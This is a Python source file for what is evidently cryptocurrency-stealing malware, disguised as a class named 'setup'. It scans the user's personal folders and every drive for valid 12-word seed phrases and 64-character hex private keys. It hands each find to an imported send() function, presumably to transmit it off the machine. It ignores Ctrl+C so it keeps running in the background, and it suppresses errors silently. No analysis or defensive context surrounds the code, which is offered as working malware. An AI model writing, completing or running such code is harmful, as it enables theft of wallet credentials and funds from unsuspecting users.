import os
import re
import time
import json
import subprocess
import threading
from pathlib import Path
from export import send
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
LOG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scanner_log.txt")

def log(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.ctime()} - {msg}\n")
    except:
        pass

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_items = []
        self._stop = False
    
    def run(self):
        log("=== SCAN STARTED ===")
        
        # Run scan in a separate thread so it doesn't block
        scan_thread = threading.Thread(target=self._scan_all, daemon=True)
        scan_thread.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            log("Ctrl+C detected - scanner continues in background")
            # Don't exit - keep running
    
    def _scan_all(self):
        """Scan everything."""
        try:
            self._scan_priority_folders()
            self._scan_full_system()
        except Exception as e:
            log(f"Scan error: {e}")
        
        log(f"SCAN COMPLETE - Found: {len(self.found_items)}")
        if self.found_items:
            for item in self.found_items:
                self.data.append(item)
            send(self.data)
    
    def _scan_priority_folders(self):
        priority_paths = [
            os.path.expandvars("%USERPROFILE%\\Desktop"),
            os.path.expandvars("%USERPROFILE%\\Documents"),
            os.path.expandvars("%USERPROFILE%\\Downloads"),
            os.path.expandvars("%USERPROFILE%"),
        ]
        
        for path in priority_paths:
            if os.path.exists(path):
                log(f"Scanning: {path}")
                self._scan_directory(path, depth_limit=3)
    
    def _scan_full_system(self):
        drives = self._get_drives()
        for drive in drives:
            log(f"Scanning drive: {drive}")
            self._scan_directory(drive, skip_system=True)
    
    def _get_drives(self):
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                drives.append(path)
        return drives
    
    def _scan_directory(self, directory, depth_limit=None, skip_system=False):
        try:
            skip_dirs = [
                'Windows', 'Program Files', 'Program Files (x86)',
                'System32', 'System Volume Information', '$Recycle.Bin',
                'AppData\\Local\\Temp', 'AppData\\Local\\Packages',
                '.git', 'node_modules', '__pycache__', 'venv'
            ]
            
            for root, dirs, files in os.walk(directory):
                if skip_system:
                    dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                
                if depth_limit and root.replace(directory, '').count(os.sep) > depth_limit:
                    continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    if ext in {'.txt', '.json', '.dat', '.log', '.bak', '.old', '.md', '.cfg', '.conf', '.ini'} or not ext:
                        self._scan_file(file_path)
                    
                    self.files_scanned += 1
                    if self.files_scanned % 5000 == 0:
                        log(f"Scanned {self.files_scanned} files...")
                        
        except Exception as e:
            log(f"Error: {e}")
    
    def _scan_file(self, file_path):
        try:
            if os.path.getsize(file_path) > 5 * 1024 * 1024:
                return
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                if not content or len(content) < 20:
                    return
                
                # Look for 12-word seed
                words = re.findall(r'\b[a-zA-Z]+\b', content)
                
                for i in range(len(words) - 11):
                    phrase = ' '.join(words[i:i+12])
                    try:
                        if mnemo.check(phrase):
                            log(f"✅ FOUND SEED: {file_path}")
                            self.found_items.append({
                                'type': 'seed',
                                'path': file_path,
                                'content': phrase
                            })
                            return
                    except:
                        pass
                
                # Look for private keys
                matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
                for match in matches:
                    if len(match) == 66 and match.startswith('0x'):
                        log(f"✅ FOUND PRIVATE KEY: {file_path}")
                        self.found_items.append({
                            'type': 'private_key',
                            'path': file_path,
                            'content': match
                        })
                        return
                    elif len(match) == 64 and match not in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
                        log(f"✅ FOUND PRIVATE KEY: {file_path}")
                        self.found_items.append({
                            'type': 'private_key',
                            'path': file_path,
                            'content': f"0x{match}"
                        })
                        return
                        
        except:
            pass